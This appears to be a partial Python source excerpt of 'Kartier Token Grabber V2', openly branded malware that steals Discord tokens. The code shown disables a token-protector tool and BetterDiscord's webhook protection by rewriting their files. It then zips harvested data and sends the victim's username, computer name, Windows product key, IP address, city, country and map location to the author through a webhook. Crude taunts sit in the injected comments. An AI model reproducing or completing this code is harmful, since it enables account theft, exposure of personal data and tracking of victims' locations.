...
class Kartier_Token_Grabber_V2:
    def __init__(self):
                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as ff:
                    ...
                    if not x:
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by Kartierjay#0001 | discord.gg/zwpWPcHyjt\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x+"\n\nMade by Kartierjay#0001 | discord.gg/zwpWPcHyjt")
                    else:
                        try:
    ...
    def bypassTokenProtector(self):
        ...
        try:
            ...
            with open(config, 'a') as f:
                f.write("\n\n//Kartier just shit on this token protector | blacked.com")
        except Exception:
            pass
    ...
    def bypassBetterDiscord(self):
        if os.path.exists(self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"):
            ...
            with open(bd, "rt", encoding="cp437") as f:
                content = f.read()
                content2 = content.replace("api/webhooks", "KartierTheGoat")
            open(bd, "w").close()
    ...
    def SendInfo(self):
        ...
        try:
            ...
            pass
        _zipfile = os.path.join(self.appdata, f'Kartier.V2-[{os.getlogin()}].zip')
        ...
        embed = {
            ...
            "embeds": [
                {
                    "author": {
                        "name": "Kartier Token Grabber.V2",
                        "url": "https://discord.gg/zwpWPcHyjt",
                        "icon_url": "https://cdn.discordapp.com/attachments/857823662802468874/936506794816200784/ezgif-5-8b7c47f1b0.gif"
                    },
                    "description": f'**{os.getlogin()}** Just ran Kartier Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                    "color": 16119101,

                    "thumbnail": {
                      "url": "https://cdn.discordapp.com/attachments/857823662802468874/937893676707885066/ezgif-3-316bb3a0bc.gif"
                    },       

                    "footer": {
                      "text": "Kartierjay#0001 https://discord.gg/zwpWPcHyjt"
                    }
                }
            ]
        }
